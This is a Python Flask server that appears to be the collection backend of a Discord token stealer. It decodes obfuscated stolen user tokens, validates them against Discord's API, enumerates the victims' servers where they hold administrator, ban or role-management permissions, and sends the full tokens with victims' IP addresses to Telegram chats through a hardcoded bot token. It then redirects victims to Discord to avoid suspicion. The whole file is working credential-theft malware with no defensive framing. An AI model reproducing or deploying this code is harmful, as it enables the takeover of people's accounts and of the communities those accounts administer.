from flask import Flask, request, redirect
import base64
import requests
import html
from datetime import datetime
import time

app = Flask(__name__)

# Telegram bot tokens and chat IDs
OBFUSCATION_KEY = 0x5A
TELEGRAM_BOT_TOKEN = "8185581454:AAGO4YJCoKKjh9oTvQpZBULF9HaVrp_vw3Y"
FULL_CHAT_ID = "-5092575672"
MASKED_CHAT_ID = "-5078508152"
TELEGRAM_API_SEND = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# Discord permissions bitmask mapping
PERMISSIONS_MAP = {
    "administrator": 0x00000008,
    "kick_members": 0x00000002,
    "ban_members": 0x00000004,
    "manage_channels": 0x00000010,
    "manage_guild": 0x00000020,
    "view_audit_log": 0x00000080,
    "manage_messages": 0x00002000,
    "mention_everyone": 0x00020000,
    "mute_members": 0x00400000,
    "manage_roles": 0x10000000,
    "manage_webhooks": 0x20000000
}

# Dictionary to track already seen tokens
seen_tokens = {}

# ====== Decoder ======
def reversible_decode(b64data: str, key: int = OBFUSCATION_KEY) -> str:
    try:
        raw = base64.b64decode(b64data)
        decoded_bytes = bytes([b ^ ((key + i) & 0xFF) for i, b in enumerate(raw)])
        return decoded_bytes.decode('utf-8')
    except Exception as e:
        return f"Error decoding token: {str(e)}"

def mask_token(token: str) -> str:
    token = token.strip()
    if len(token) <= 8:
        return token[:2] + "…" + token[-2:]
    return f"{token[:4]}…{token[-4:]}"

def send_telegram_html(chat_id: int, html_text: str):
    try:
        payload = {
            "chat_id": chat_id,
            "text": html_text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        r = requests.post(TELEGRAM_API_SEND, data=payload, timeout=10)
        r.raise_for_status()
        return r.json()
    except requests.RequestException as e:
        # Handle any issues with sending the request
        error_message = f"Error sending message to Telegram: {str(e)}"
        send_telegram_html(MASKED_CHAT_ID, f"<pre>{error_message}</pre>")
        return None

def get_discord_user(token: str):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
        elif r.status_code == 429:  # Discord rate limit
            send_telegram_html(MASKED_CHAT_ID, f"<pre>Discord rate limited while fetching user data</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(MASKED_CHAT_ID, f"<pre>Error fetching user data: {str(e)}</pre>")
    return None

def get_discord_guilds(token: str):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
        elif r.status_code == 429:  # Discord rate limit
            send_telegram_html(MASKED_CHAT_ID, f"<pre>Discord rate limited while fetching guilds</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(MASKED_CHAT_ID, f"<pre>Error fetching guilds: {str(e)}</pre>")
    return []

def parse_permissions(guild, token_perms: int):
    perms_list = []
    if guild.get("owner"):
        perms_list.append("Server Owner")
    for name, bit in PERMISSIONS_MAP.items():
        if (int(token_perms) & bit) != 0:
            perms_list.append(name)
    return perms_list

def get_guild_membercount(token: str, guild_id: str):
    """Fetch actual member count via /guilds/{id}?with_counts=true"""
    try:
        headers = {"Authorization": token}
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}?with_counts=true",
            headers=headers,
            timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            return data.get("approximate_member_count", "N/A")
        elif r.status_code == 429:  # Discord rate limit
            send_telegram_html(MASKED_CHAT_ID, f"<pre>Discord rate limited while fetching member count</pre>")
            return None
    except requests.RequestException as e:
        send_telegram_html(MASKED_CHAT_ID, f"<pre>Error fetching member count: {str(e)}</pre>")
    return "N/A"

@app.route("/callback", methods=["GET", "POST"])
def callback():
    raw = request.values.get("data") or request.values.get("token") or ""
    if not raw:
        return "No data provided; include 'data' or 'token' query param", 400

    # Decode the raw data if it's base64 encoded
    decoded_data = reversible_decode(raw)
    if "Error decoding token" in decoded_data:
        send_telegram_html(MASKED_CHAT_ID, f"<pre>{decoded_data}</pre>")
        return "Error decoding token", 400

    # Parse entries: format {discord_id:token,...}
    entries = []
    for part in decoded_data.strip("{}").split(","):
        if ":" in part:
            discord_id, token = part.split(":", 1)
            entries.append((discord_id.strip(), token.strip()))

    if not entries:
        return "No entries parsed", 400

    remote_ip = request.remote_addr or "unknown"
    time_str = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    for discord_id, token in entries:
        # Get Discord username
        user_data = get_discord_user(token)
        if not user_data or user_data.get('username') == "Unknown":
            send_telegram_html(MASKED_CHAT_ID, f"<pre>Invalid token detected for Discord ID: {discord_id}</pre>")
            continue  # Skip invalid token

        username = f"{user_data.get('username')}#{user_data.get('discriminator')}"

        # Check if token has already been sent for this discord_id
        if discord_id in seen_tokens:
            if seen_tokens[discord_id] == token:
                continue  # Skip if the token hasn't changed

        # Gather guild info
        guilds = get_discord_guilds(token)
        guild_lines = []
        for g in guilds:
            perms = parse_permissions(g, g.get("permissions", "0"))
            if perms:
                member_count = get_guild_membercount(token, g.get("id"))
                guild_lines.append(f"{html.escape(g.get('name', 'Unknown'))} | {member_count} | {', '.join(perms)}")
        if not guild_lines:
            guild_lines.append("No Permissions Found")

        guilds_blockquote = "<pre>" + "\n".join(guild_lines) + "</pre>"

        # Compose messages for masked and unmasked token
        # Masked chat keeps old formatting
        masked_html = (
            f"<b>New token received</b>\n"
            f"<pre>Discord Username: {html.escape(username)}\n"
            f"Discord ID: {discord_id}\n"
            f"Token: {html.escape(mask_token(token))}\n"
            f"IP: {remote_ip}\n"
            f"Time: {time_str}</pre>\n"
            f"---------------------\n"
            f"{guilds_blockquote}"
        )
        send_telegram_html(MASKED_CHAT_ID, masked_html)

        # Unmasked chat gets improved formatting
        unmasked_html = (
            f"<b>New token received</b>\n"
            f"<pre>Discord Username: {html.escape(username)}\n"
            f"Discord ID: {discord_id}\n"
            f"IP: {remote_ip}\n"
            f"Time: {time_str}</pre>\n"
            f"---------------------\n"
            f"{guilds_blockquote}\n"
            f"---------------------\n"
            f"<pre>{html.escape(token)}</pre>"
        )
        send_telegram_html(FULL_CHAT_ID, unmasked_html)

        # Store the token to avoid resending it
        seen_tokens[discord_id] = token

    return redirect("https://discord.com/channels/@me")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
